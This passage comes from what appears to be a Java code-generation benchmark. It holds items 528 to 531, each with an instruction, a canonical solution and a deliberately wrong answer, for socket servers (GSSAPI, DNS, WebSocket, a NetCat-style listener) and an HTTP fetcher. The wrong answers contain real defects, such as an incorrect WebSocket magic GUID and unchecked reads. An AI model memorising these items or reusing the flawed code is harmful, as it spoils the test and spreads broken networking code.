sClient.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n\nclass ThreadProxy implements Runnable {\n    private Socket clientSocket;\n    private JankyProxy proxy;\n\n    public ThreadProxy(Socket clientSocket, JankyProxy proxy) {\n        this.clientSocket = clientSocket;\n        this.proxy = proxy;\n    }\n\n    public void run() {\n        proxy.run();\n    }\n\n    public void shutdown() {\n        try {\n            if (clientSocket != null) {\n                clientSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 528,
    "Instruction": "Task Description: Implement a Java class that creates a TCP server using ServerSocket with GSSAPI (Generic Security Services API) authentication for secure client-server communication.\n\nClass Description: The GSSServer class establishes a secure TCP server that listens for incoming client connections, performs GSSAPI authentication, and enables secure message exchange between server and client.\n\nAttributes:\n- s: [ServerSocket] - The server socket that listens for incoming client connections on a specified port.\n\nMethods:\n- main([String[] args]) -> [void] - Entry point of the server application. Parses command line arguments (service name, port, and mechanism OID), creates server credentials, and starts listening for client connections.\n  Input: Command line arguments (optional: -port [portNumber], -mech [mechanismOID], serviceName)\n  Output: None (runs indefinitely until terminated)\n\n- processClient([GSSCredential server], [Socket client]) -> [void] - Handles an individual client connection by performing GSSAPI authentication and establishing a secure context.\n  Input: \n    - server: [GSSCredential] - Server's credentials for authentication\n    - client: [Socket] - Client connection socket\n  Output: None (closes connection when done)\n\n- exchangeWithPeer([GSSContext aCtxt], [DataInputStream dis], [DataOutputStream dos]) -> [void] - Performs secure message exchange with an authenticated client.\n  Input:\n    - aCtxt: [GSSContext] - Established security context\n    - dis: [DataInputStream] - Input stream from client\n    - dos: [DataOutputStream] - Output stream to client\n  Output: None (sends response and closes connection)\n\n- usage() -> [void] - Prints usage instructions for the server application.\n  Input: None\n  Output: None (prints to console)\n\n- print([String msg]) -> [void] - Helper method to print messages to console.\n  Input: msg [String] - Message to print\n  Output: None (prints to console)\n\n- exit([int status]) -> [void] - Cleanly shuts down the server by closing the server socket and exiting the application.\n  Input: status [int] - Exit status code\n  Output: None (terminates application)",
    "Canonical_solution": "import java.io.*;\nimport java.net.*;\nimport com.sun.gssapi.*;\n\nclass GSSServer {\n\n    private static ServerSocket s;\n\n    public static void main(String args[]) {\n        int port = 4444;\n\n        if (args.length < 1) {\n            usage();\n            exit(-1);\n        }\n\n        try {\n            String serviceName = args[args.length-1];\n            Oid mechOid = GSSManager.getDefaultMech();\n\n            for (int i = 0; i < args.length; i++) {\n                if (args[i].equals(\"-port\")) {\n                    if (i >= (args.length - 2)) {\n                        usage();\n                        exit(-1);\n                    }\n                    port = Integer.parseInt(args[++i]);\n                } else if (args[i].equals(\"-mech\")) {\n                    if (i >= (args.length-2)) {\n                        usage();\n                        exit(-1);\n                    }\n                    mechOid = new Oid(args[++i]);\n                }\n            }\n\n            GSSCredential server = new GSSCredential(new GSSName(serviceName,\n                GSSName.NT_HOSTBASED_SERVICE), GSSCredential.INDEFINITE,\n                mechOid, GSSCredential.ACCEPT_ONLY);\n\n            s = new ServerSocket(port);\n\n            while (true) {\n                Socket c = s.accept();\n                processClient(server, c);\n            }\n        } catch (IOException e) {\n            print(\"\\n**Communication ERROR**:\\t\" + e.getMessage());\n            e.printStackTrace();\n            exit(-1);\n        } catch (GSSException e) {\n            print(\"\\n**GSSAPI ERROR**:\\t\" + e.getMessage());\n            e.printStackTrace();\n            exit(-1);\n        }\n    }\n\n    private static void processClient(GSSCredential server, Socket client)\n            throws GSSException, IOException {\n        DataInputStream dis = new DataInputStream(new BufferedInputStream(client.getInputStream()));\n        DataOutputStream dos = new DataOutputStream(client.getOutputStream());\n\n        int tokLen = dis.readInt();\n        byte []inTok = new byte[tokLen];\n        dis.readFully(inTok, 0, inTok.length);\n\n        GSSContext aCtxt = new GSSContext(server);\n\n        do {\n            byte []outTok = aCtxt.accept(inTok, 0, inTok.length);\n\n            if (outTok != null) {\n                dos.writeInt(outTok.length);\n                dos.write(outTok);\n            }\n\n            if (aCtxt.isEstablished())\n                break;\n\n            inTok = new byte[dis.readInt()];\n            dis.readFully(inTok, 0, inTok.length);\n        } while (true);\n\n        exchangeWithPeer(aCtxt, dis, dos);\n        aCtxt.dispose();\n        client.close();\n    }\n\n    private static void exchangeWithPeer(GSSContext aCtxt, DataInputStream dis,\n            DataOutputStream dos) throws GSSException, IOException {\n        int len = dis.readInt();\n        ByteArrayOutputStream bos = new ByteArrayOutputStream();\n        MessageProp mInfo = new MessageProp();\n\n        aCtxt.unwrap(dis, bos, mInfo);\n\n        mInfo.setQOP(0);\n        mInfo.setPrivacy(false);\n\n        byte []peerTok = bos.toByteArray();\n        byte []toPeer = aCtxt.getMIC(peerTok, 0, peerTok.length, mInfo);\n\n        dos.writeInt(toPeer.length);\n        dos.write(toPeer);\n        dos.close();\n    }\n\n    private static void usage() {\n        print(\"\\nUsage:\\tGSSServert [-mech 1.2.34] [-port port] serviceName\");\n    }\n\n    private static void print(String msg) {\n        System.out.println(msg);\n    }\n\n    private static void exit(int status) {\n        if (s != null) {\n            try {\n                s.close();\n            } catch (IOException e) {};\n        }\n        System.exit(status);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class GSSServer {\n    private ServerSocket s;\n\n    public static void main(String[] args) {\n        GSSServer server = new GSSServer();\n        server.start(args);\n    }\n\n    public void start(String[] args) {\n        int port = 8888;\n        String serviceName = null;\n        String mechOID = \"SPNEGO\";\n        boolean hasService = false;\n\n        for (int i = 0; i < args.length; i++) {\n            if (args[i].equals(\"-service\")) {\n                serviceName = args[++i];\n                hasService = true;\n            } else if (args[i].equals(\"-port\")) {\n                port = Integer.parseInt(args[++i]);\n            } else if (args[i].equals(\"-mech\")) {\n                mechOID = args[++i];\n            }\n        }\n\n        if (!hasService) {\n            usage();\n            return;\n        }\n\n        try {\n            s = new ServerSocket(port);\n            GSSCredential serverCred = createServerCredential(serviceName, mechOID);\n            print(\"Server started on port \" + port + \" with service \" + serviceName);\n            while (true) {\n                Socket client = s.accept();\n                processClient(serverCred, client);\n            }\n        } catch (Exception e) {\n            print(\"Error: \" + e.getMessage());\n            exit(1);\n        }\n    }\n\n    private GSSCredential createServerCredential(String serviceName, String mechOID) throws Exception {\n        GSSManager manager = GSSManager.getInstance();\n        Oid mech = new Oid(mechOID);\n        GSSName name = manager.createName(serviceName, GSSName.NT_SERVICE);\n        return manager.createCredential(name, GSSCredential.INDEFINITE_LIFETIME, mech, GSSCredential.REUSE);\n    }\n\n    public void processClient(GSSCredential server, Socket client) {\n        try {\n            GSSManager manager = GSSManager.getInstance();\n            GSSContext context = manager.createContext(server);\n            DataInputStream dis = new DataInputStream(client.getInputStream());\n            DataOutputStream dos = new DataOutputStream(client.getOutputStream());\n            byte[] token = new byte[1024];\n            int len = dis.read(token);\n            if (len > 0) {\n                context.acceptSecContext(token, 0, len);\n            }\n            exchangeWithPeer(context, dis, dos);\n        } catch (GSSException e) {\n            print(\"GSSException: \" + e.getMessage());\n        } catch (IOException e) {\n            print(\"IOException: \" + e.getMessage());\n        } finally {\n            try {\n                if (client != null) {\n                    client.close();\n                }\n            } catch (IOException e) {\n                print(\"Error closing client socket: \" + e.getMessage());\n            }\n        }\n    }\n\n    public void exchangeWithPeer(GSSContext aCtxt, DataInputStream dis, DataOutputStream dos) throws IOException {\n        try {\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = dis.read(buffer)) > 0) {\n                byte[] unsealed = aCtxt.unseal(buffer, 0, bytesRead);\n                String msg = new String(unsealed);\n                print(\"Received: \" + msg);\n                String response = \"Echo: \" + msg;\n                byte[] sealed = aCtxt.seal(response.getBytes(), 0, response.length());\n                dos.write(sealed);\n                dos.flush();\n            }\n        } catch (GSSException e) {\n            print(\"GSSException during exchange: \" + e.getMessage());\n        }\n    }\n\n    public void usage() {\n        System.out.println(\"Usage: java GSSServer -service <serviceName> [-port <port>] [-mech <oid>]\");\n    }\n\n    public void print(String msg) {\n        System.out.println(msg);\n    }\n\n    public void exit(int status) {\n        try {\n            if (s != null) {\n                s.close();\n            }\n        } catch (IOException e) {\n            print(\"Error closing socket: \" + e.getMessage());\n        }\n        System.exit(status);\n    }\n}"
  },
  {
    "Task_id": 529,
    "Instruction": "Task Description: Implement a Java class for handling DNS connections using TCP sockets, including server listening, client connection, message sending/receiving, and resource cleanup.\n\nClass Description: The DNSConnection class provides functionality for establishing and managing TCP-based DNS connections. It supports both server-side (incoming) and client-side (outgoing) connections, message transmission with length prefixing, and proper resource management.\n\nAttributes:\n- PORT: [int] - Constant defining the DNS port (53)\n- MAX_MSG_LEN: [int] - Maximum allowed message length (65535)\n- listener: [ServerSocket] - Server socket for incoming connections\n- socket: [Socket] - Current active socket connection\n- msgBytes: [byte[]] - Buffer for received message data\n- msgLen: [int] - Length of the current message\n- in: [BufferedInputStream] - Input stream for reading data\n- out: [OutputStream] - Output stream for writing data\n- lenBuf: [byte[]] - Buffer for message length prefix (2 bytes)\n\nMethods:\n- listen(): [void] -> [void] - Starts listening for incoming connections on the DNS port\n- stopListening(): [void] -> [void] - Stops the server socket from listening\n- openIncoming(): [void] -> [void] - Accepts an incoming client connection\n- open(InetAddress server): [void] -> [void] - Opens a connection to a DNS server\n- send(byte[] msgBytes): [void] -> [void] - Sends a message with length prefix\n- receive(boolean wait): [byte[]] -> [byte[]] - Receives a message (optionally waiting)\n- close(): [void] -> [void] - Closes the current connection and cleans up resources",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.EOFException;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\n\npublic final class DNSConnection {\n\n    public static final int PORT = 53;\n    public static final int MAX_MSG_LEN = 0xFFFF;\n    protected static ServerSocket listener;\n    protected Socket socket;\n    protected byte[] msgBytes;\n    protected int msgLen;\n    protected BufferedInputStream in;\n    protected OutputStream out;\n    protected final byte[] lenBuf = new byte[2];\n\n    public DNSConnection() {}\n\n    public static void listen() throws IOException {\n        ServerSocket curListener;\n        if ((curListener = listener) == null) {\n            try {\n                listener = new ServerSocket(PORT);\n            } catch (SecurityException e) {\n                throw new SocketException(\"SecurityException: listen()\");\n            }\n        }\n        curListener = null;\n    }\n\n    public static void stopListening() {\n        ServerSocket curListener;\n        if ((curListener = listener) != null) {\n            listener = null;\n            try {\n                curListener.close();\n            } catch (IOException e) {}\n            curListener = null;\n        }\n    }\n\n    public void openIncoming() throws IOException {\n        ServerSocket curListener;\n        if ((curListener = listener) != null) {\n            try {\n                Socket socket = curListener.accept();\n                BufferedInputStream in = new BufferedInputStream(socket.getInputStream(), DNSMsgHeader.UDP_PACKET_LEN);\n                this.out = socket.getOutputStream();\n                this.in = in;\n                this.msgBytes = null;\n                this.socket = socket;\n                return;\n            } catch (SecurityException e) {}\n        }\n        throw new SocketException(curListener == null ? \"Not listening\" : \"SecurityException: accept()\");\n    }\n\n    public void open(InetAddress server) throws NullPointerException, IOException {\n        server.hashCode();\n        try {\n            Socket socket = new Socket(server, PORT);\n            BufferedInputStream in = new BufferedInputStream(socket.getInputStream(), DNSMsgHeader.UDP_PACKET_LEN);\n            this.out = socket.getOutputStream();\n            this.in = in;\n            this.socket = socket;\n        } catch (SecurityException e) {\n            throw new SocketException(\"SecurityException: connect(\" + server.getHostAddress() + \")\");\n        }\n        this.msgBytes = null;\n    }\n\n    public void send(byte[] msgBytes) throws NullPointerException, IOException {\n        int msgLen;\n        if ((msgLen = msgBytes.length) >= MAX_MSG_LEN)\n            msgLen = MAX_MSG_LEN;\n        OutputStream out;\n        if ((out = this.out) == null)\n            throw new SocketException(\"Connection closed\");\n        byte[] lenBuf = this.lenBuf;\n        lenBuf[0] = (byte)(msgLen >> 8);\n        lenBuf[1] = (byte)msgLen;\n        out.write(lenBuf, 0, 2);\n        out.write(msgBytes, 0, msgLen);\n        out.flush();\n    }\n\n    public byte[] receive(boolean wait) throws IOException {\n        byte[] msgBytes;\n        int msgLen, len;\n        BufferedInputStream in;\n        if ((in = this.in) == null)\n            throw new SocketException(\"Connection closed\");\n        if ((msgLen = this.msgLen) <= 0)\n            msgLen = 0;\n        if ((msgBytes = this.msgBytes) == null) {\n            do {\n                if (!wait && in.available() <= 0)\n                    return null;\n                else if ((len = in.read()) < 0)\n                    throw new EOFException();\n                else if (msgLen <= 0)\n                    this.msgLen = msgLen = len + 1;\n                else break;\n            } while (true);\n            if ((msgLen = ((msgLen - 1) << 8) | len) <= 0)\n                msgLen = 0;\n            this.msgBytes = msgBytes = new byte[msgLen];\n            msgLen = 0;\n        }\n        for (int avail; (len = msgBytes.length - (this.msgLen = msgLen)) > 0; msgLen += len)\n            if (!wait && (avail = in.available()) < len && (len = avail) <= 0)\n                return null;\n            else if ((len = in.read(msgBytes, msgLen, len)) < 0)\n                throw new EOFException();\n        this.msgBytes = null;\n        this.msgLen = 0;\n        return msgBytes;\n    }\n\n    public void close() {\n        Socket socket;\n        if ((socket = this.socket) != null) {\n            this.socket = null;\n            this.in = null;\n            this.out = null;\n            this.msgBytes = null;\n            try {\n                socket.close();\n            } catch (IOException e) {}\n            socket = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class DNSConnection {\n    private static final int PORT = 53;\n    private static final int MAX_MSG_LEN = 65535;\n    private ServerSocket listener;\n    private Socket socket;\n    private byte[] msgBytes;\n    private int msgLen;\n    private BufferedInputStream in;\n    private OutputStream out;\n    private byte[] lenBuf = new byte[2];\n\n    public void listen() throws IOException {\n        listener = new ServerSocket(PORT);\n    }\n\n    public void stopListening() {\n        if (listener != null) {\n            try {\n                listener.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void openIncoming() throws IOException {\n        socket = listener.accept();\n        in = new BufferedInputStream(socket.getInputStream());\n        out = socket.getOutputStream();\n    }\n\n    public void open(InetAddress server) throws IOException {\n        socket = new Socket(server, PORT);\n        in = new BufferedInputStream(socket.getInputStream());\n        out = socket.getOutputStream();\n    }\n\n    public void send(byte[] msgBytes) throws IOException {\n        if (msgBytes.length > MAX_MSG_LEN) {\n            throw new IllegalArgumentException(\"Message too long\");\n        }\n        lenBuf[0] = (byte) (msgBytes.length >>> 8);\n        lenBuf[1] = (byte) (msgBytes.length >>> 0);\n        out.write(lenBuf);\n        out.write(msgBytes);\n        out.flush();\n    }\n\n    public byte[] receive(boolean wait) throws IOException {\n        int bytesRead = 0;\n        while (bytesRead < 2) {\n            bytesRead += in.read(lenBuf, bytesRead, 2 - bytesRead);\n            if (bytesRead == 0 && !wait) {\n                return null;\n            }\n        }\n        int len = ByteBuffer.wrap(lenBuf).getShort() & 0xFFFF;\n        if (len > MAX_MSG_LEN) {\n            return null;\n        }\n        byte[] msg = new byte[len];\n        bytesRead = 0;\n        while (bytesRead < len) {\n            bytesRead += in.read(msg, bytesRead, len - bytesRead);\n            if (bytesRead == 0 && !wait) {\n                return null;\n            }\n        }\n        return msg;\n    }\n\n    public void close() throws IOException {\n        if (socket != null) {\n            socket.close();\n            in.close();\n            out.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 53,
    "Instruction": "Task Description: Create a function that retrieves content from a given HTTP/HTTPS URL and handles redirects with proper cookie management.\n\nFunction Description: The function establishes an HTTP connection to the specified URL, follows redirects (up to 10 times), maintains cookies during redirects, and returns the input stream of the final response. It handles standard HTTP response codes and supports common request headers.\n\nInput: \n- urlStr: String - The URL string to fetch content from (must start with \"http://\" or \"https://\")\n\nOutput: \n- InputStream - The input stream containing the response data from the final URL after following redirects, or null if:\n  - The URL scheme is not HTTP/HTTPS\n  - An exception occurs during the process\n  - Maximum redirect count (10) is exceeded",
    "Canonical_solution": "import java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nprivate InputStream getKmlContents(String urlStr) {\n    InputStream inputStream;\n    try {\n        if (urlStr.startsWith(\"http://\") || urlStr.startsWith(\"https://\")) {\n            URL url = new URL(urlStr);\n            boolean redirect = true;\n            HttpURLConnection http = null;\n            String cookies = null;\n            int redirectCnt = 0;\n            while(redirect && redirectCnt < 10) {\n                redirect = false;\n                http = (HttpURLConnection)url.openConnection();\n                http.setRequestMethod(\"GET\");\n                if (cookies != null) {\n                    http.setRequestProperty(\"Cookie\", cookies);\n                }\n                http.addRequestProperty(\"Accept-Language\", \"en-US,en;q=0.8\");\n                http.addRequestProperty(\"User-Agent\", \"Mozilla\");\n                http.setInstanceFollowRedirects(true);\n                HttpURLConnection.setFollowRedirects(true);\n\n                int status = http.getResponseCode();\n                if (status != HttpURLConnection.HTTP_OK) {\n                    if (status == HttpURLConnection.HTTP_MOVED_TEMP\n                        || status == HttpURLConnection.HTTP_MOVED_PERM\n                        || status == HttpURLConnection.HTTP_SEE_OTHER)\n                        redirect = true;\n                }\n                if (redirect) {\n                    url = new URL(http.getHeaderField(\"Location\"));\n                    cookies = http.getHeaderField(\"Set-Cookie\");\n                    http.disconnect();\n                    redirectCnt++;\n                }\n            }\n            inputStream = http.getInputStream();\n        } else {\n            // Handle other URL types (file://, etc)\n            return null;\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n        return null;\n    }\n    return inputStream;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.net.CookieHandler;\nimport java.net.CookieManager;\nimport java.net.CookiePolicy;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.io.InputStream;\n\npublic class HttpFetcher {\n    public InputStream fetchContent(String urlStr) {\n        if (!urlStr.startsWith(\"http://\") && !urlStr.startsWith(\"https://\")) {\n            return null;\n        }\n\n        CookieManager cookieManager = new CookieManager();\n        cookieManager.setCookiePolicy(CookiePolicy.ACCEPT_ALL);\n        CookieHandler.setDefault(cookieManager);\n\n        int redirectCount = 0;\n        URL url;\n        try {\n            url = new URL(urlStr);\n        } catch (Exception e) {\n            return null;\n        }\n\n        while (redirectCount <= 10) {\n            try {\n                HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n                conn.setRequestMethod(\"GET\");\n                conn.setInstanceFollowRedirects(false);\n                conn.setConnectTimeout(5000);\n                conn.setReadTimeout(5000);\n\n                int responseCode = conn.getResponseCode();\n                if (responseCode == HttpURLConnection.HTTP_MOVED_PERM || \n                    responseCode == HttpURLConnection.HTTP_MOVED_TEMP || \n                    responseCode == HttpURLConnection.HTTP_SEE_OTHER) {\n                    String newUrl = conn.getHeaderField(\"Location\");\n                    if (newUrl == null) {\n                        return null;\n                    }\n                    url = new URL(newUrl);\n                    redirectCount++;\n                    if (redirectCount > 10) {\n                        return null;\n                    }\n                } else {\n                    if (responseCode >= 200 && responseCode < 300) {\n                        return conn.getInputStream();\n                    } else {\n                        return null;\n                    }\n                }\n            } catch (Exception e) {\n                return null;\n            }\n        }\n\n        return null;\n    }\n}"
  },
  {
    "Task_id": 530,
    "Instruction": "Task Description: Implement a WebSocket server class in Java that handles WebSocket connections, performs the WebSocket handshake protocol, and manages client connections.\n\nClass Description: The WebSocketServer class represents a TCP server that implements the WebSocket protocol. It listens for incoming connections, handles the WebSocket handshake, and manages client connections. The server runs in a separate thread to avoid blocking the main thread.\n\nAttributes:\n- serverSocket: ServerSocket - The server socket that listens for incoming connections\n- port: int - The port number on which the server listens\n- serverThread: Thread - The thread in which the server runs\n\nMethods:\n- WebSocketServer(int port) -> None - Constructor that initializes the server with the specified port\n- start() -> None - Starts the server in a new thread and begins listening for connections\n- stop() -> None - Stops the server and releases all resources\n- handleClientConnection(Socket client) -> None - Handles the WebSocket handshake protocol for a connected client\n- generateFinalKey(String in) -> String - Generates the Sec-WebSocket-Accept key for the WebSocket handshake response",
    "Canonical_solution": "import java.net.ServerSocket;\nimport java.net.Socket;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.util.Scanner;\n\npublic class WebSocketServer {\n\n    private ServerSocket serverSocket;\n    private int port;\n    private Thread serverThread;\n\n    public WebSocketServer(int port) {\n        this.port = port;\n    }\n\n    public void start() {\n        serverThread = new Thread(() -> {\n            try {\n                serverSocket = new ServerSocket(port);\n                serverSocket.setReuseAddress(true);\n                while (true) {\n                    Socket client = null;\n                    try {\n                        client = serverSocket.accept();\n                        handleClientConnection(client);\n                    } catch (IOException e) {\n                        // Handle client connection error\n                    }\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        });\n        serverThread.start();\n    }\n\n    private void handleClientConnection(Socket client) throws IOException {\n        Scanner in = new Scanner(client.getInputStream());\n        OutputStream os = client.getOutputStream();\n        \n        // Read client handshake\n        String input = in.nextLine();\n        String testCase = input.split(\" \")[1];\n        String seckey = \"\";\n        while (in.hasNext()) {\n            input = in.nextLine();\n            if (input.startsWith(\"Sec-WebSocket-Key: \")) {\n                seckey = input.split(\" \")[1];\n            }\n            if (input.startsWith(\"Upgrade\")) {\n                break;\n            }\n        }\n\n        // Send response based on test case\n        String response = \"HTTP/1.1 101 Websocket Connection Upgrade\\r\\n\" +\n                         \"Upgrade: websocket\\r\\n\" +\n                         \"Connection: Upgrade\\r\\n\" +\n                         \"Sec-WebSocket-Accept: \" + generateFinalKey(seckey) + \"\\r\\n\\r\\n\";\n        os.write(response.getBytes());\n        os.flush();\n    }\n\n    public void stop() throws IOException {\n        if (serverSocket != null) {\n            serverSocket.close();\n        }\n        if (serverThread != null) {\n            serverThread.interrupt();\n        }\n    }\n\n    private String generateFinalKey(String in) {\n        String seckey = in.trim();\n        String acc = seckey + \"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\";\n        try {\n            java.security.MessageDigest sh1 = java.security.MessageDigest.getInstance(\"SHA1\");\n            return org.java_websocket.util.Base64.encodeBytes(sh1.digest(acc.getBytes()));\n        } catch (java.security.NoSuchAlgorithmException e) {\n            throw new IllegalStateException(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class WebSocketServer {\n    private ServerSocket serverSocket;\n    private int port;\n    private Thread serverThread;\n\n    public WebSocketServer(int port) {\n        this.port = port;\n    }\n\n    public void start() {\n        serverThread = new Thread(() -> {\n            try {\n                serverSocket = new ServerSocket(port);\n                System.out.println(\"WebSocket server started on port \" + port);\n                while (true) {\n                    Socket client = serverSocket.accept();\n                    handleClientConnection(client);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n        serverThread.start();\n    }\n\n    public void stop() {\n        try {\n            if (serverSocket != null) {\n                serverSocket.close();\n            }\n            serverThread.interrupt();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void handleClientConnection(Socket client) {\n        try {\n            BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));\n            PrintWriter writer = new PrintWriter(client.getOutputStream(), true);\n\n            String line;\n            StringBuilder headers = new StringBuilder();\n            while ((line = reader.readLine()) != null && !line.isEmpty()) {\n                headers.append(line).append(\"\\r\\n\");\n            }\n\n            String key = extractHeader(headers.toString(), \"Sec-WebSocket-Key\");\n            if (key == null) {\n                client.close();\n                return;\n            }\n\n            String acceptKey = generateFinalKey(key);\n            String response = \"HTTP/1.1 101 Switching Protocols\\r\\n\" +\n                    \"Upgrade: websocket\\r\\n\" +\n                    \"Connection: upgrade\\r\\n\" +\n                    \"Sec-WebSocket-Accept: \" + acceptKey + \"\\r\\n\\r\\n\";\n            writer.print(response);\n            writer.flush();\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private String extractHeader(String headers, String headerName) {\n        String[] lines = headers.split(\"\\r\\n\");\n        for (String line : lines) {\n            if (line.startsWith(headerName + \": \")) {\n                return line.substring(headerName.length() + 2).trim();\n            }\n        }\n        return null;\n    }\n\n    private String generateFinalKey(String in) {\n        String magic = \"258EAFA5-E4D4-4BFA-A32F-584996227644\";\n        String input = in + magic;\n        byte[] sha1 = MessageDigest.getInstance(\"SHA-1\").digest(input.getBytes(StandardCharsets.UTF_8));\n        return Base64.getEncoder().encodeToString(sha1);\n    }\n}"
  },
  {
    "Task_id": 531,
    "Instruction": "Task Description: Create a Java class that implements a simplified NetCat-like TCP server using ServerSocket for client-server communication, with WebSocket support for real-time interaction.\n\nClass Description: The NetCat class is a WebSocket plugin that creates a TCP server listening on a specified port, accepts client connections, and enables bidirectional communication between server and client through input/output streams.\n\nAttributes:\nport: [int] - The port number on which the server listens for client connections\nserver: [ServerSocket] - The ServerSocket instance used to accept client connections\nclient: [Socket] - The Socket instance representing the connected client\npool: [ExecutorService] - Thread pool for handling client communication\nos: [OutputStream] - Output stream for sending data to the client\npw: [PrintWriter] - Buffered writer for sending data to the client\n\nMethods:\ncheck: [Map param] -> [boolean] - Validates if the specified port is valid (>= 10000)\nbefore: [void] -> [void] - Initializes the ServerSocket and starts listening for connections\nlisten: [void] -> [void] - Accepts incoming client connections and sets up I/O streams\necho: [void] -> [void] - Continuously reads and displays data received from the client\nstart: [void] -> [Object] - Main execution loop that sends user input to the client\nonClose: [void] -> [void] - Cleans up resources by closing sockets and shutting down threads",
    "Canonical_solution": "import com.trackray.base.annotation.Plugin;\nimport com.trackray.base.annotation.Param;\nimport com.trackray.base.annotation.Rule;\nimport com.trackray.base.plugin.WebSocketPlugin;\nimport org.apache.commons.lang3.StringUtils;\n\nimport java.io.*;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Map;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\n@Plugin(value = \"netcat\", title = \"NetCat \u7b80\u6613\u7248\" , author = \"\u6d45\u84dd\")\n@Rule(params = {@Param(key = \"port\",defaultValue = \"10010\" , desc = \"\u76d1\u542c\u7684\u7aef\u53e3\uff0c\u5c3d\u91cf\u907f\u514d\u5c0f\u4e8e10000\u7684\u7aef\u53e3\"),},\n        sync = true,  websocket = true )\npublic class NetCat extends WebSocketPlugin {\n    private int port;\n    private ServerSocket server;\n    private Socket client;\n    private ExecutorService pool;\n    private OutputStream os;\n    private PrintWriter pw;\n\n    @Override\n    public boolean check(Map param) {\n        port = Integer.parseInt(param.get(\"port\").toString());\n        return port >= 10000;\n    }\n\n    @Override\n    public void before() {\n        try {\n            server = new ServerSocket(port);\n            pool = Executors.newSingleThreadExecutor();\n            println(\"port:\"+port);\n            println(\"\u7b49\u5f85\u5ba2\u6237\u7aef\u8fde\u63a5\");\n            listen();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void listen() {\n        try {\n            client = server.accept();\n            if (client.isConnected()){\n                println(\"\u5ba2\u6237\u7aef\u5df2\u8fde\u63a5:\"+client.getInetAddress().getHostAddress());\n                os = client.getOutputStream();\n                pw = new PrintWriter(os, true);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        pool.execute(() -> {\n            while (true){\n                echo();\n            }\n        });\n    }\n\n    private void echo() {\n        try {\n            if (client.isConnected()){\n                InputStream is = client.getInputStream();\n                BufferedReader bri = new BufferedReader(new InputStreamReader(is));\n                String temp;\n                while ((temp = bri.readLine())!=null && !\"\".equals(temp)) {\n                    println(temp);\n                }\n            }\n        }catch (Exception e){\n            println(e.getMessage());\n        }\n    }\n\n    @Override\n    public Object start() {\n        while (client!=null && client.isConnected()){\n            String input = getInput();\n            if (StringUtils.isNotBlank(input)){\n                pw.println(input);\n            }\n        }\n        println(\"\u4e3b\u673a\u5df2\u4e0b\u7ebf\");\n        return null;\n    }\n\n    @Override\n    public void onClose() {\n        try {\n            pool.shutdownNow();\n            if (client!=null && !client.isClosed())\n            {\n                client.close();\n            }\n            server.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class NetCat {\n    private int port;\n    private ServerSocket server;\n    private Socket client;\n    private ExecutorService pool;\n    private OutputStream os;\n    private PrintWriter pw;\n\n    public NetCat(int port) {\n        this.port = port;\n    }\n\n    public boolean check(Map<String, Object> param) {\n        Integer p = (Integer) param.get(\"port\");\n        return p != null && p >= 10000;\n    }\n\n    public void before() {\n        try {\n            server = new ServerSocket(port);\n            pool = Executors.newCachedThreadPool();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void listen() {\n        try {\n            client = server.accept();\n            os = client.getOutputStream();\n            pw = new PrintWriter(new BufferedWriter(new OutputStreamWriter(os)));\n            pool.submit(this::echo);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void echo() {\n        try {\n            BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(\"Received: \" + line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void start() {\n        Scanner scanner = new Scanner(System.in);\n        while (true) {\n            String input = scanner.nextLine();\n            if (pw != null) {\n                pw.println(input);\n                pw.flush();\n            }\n        }\n    }\n\n    public void onClose() {\n        if (client != null) {\n            try {\n                client.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (server != null) {\n            try {\n                server.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (pool != null) {\n            pool.shutdown();\n        }\n        if (os != null) {\n            try {\n                os.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (pw != null) {\n            pw.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 532,
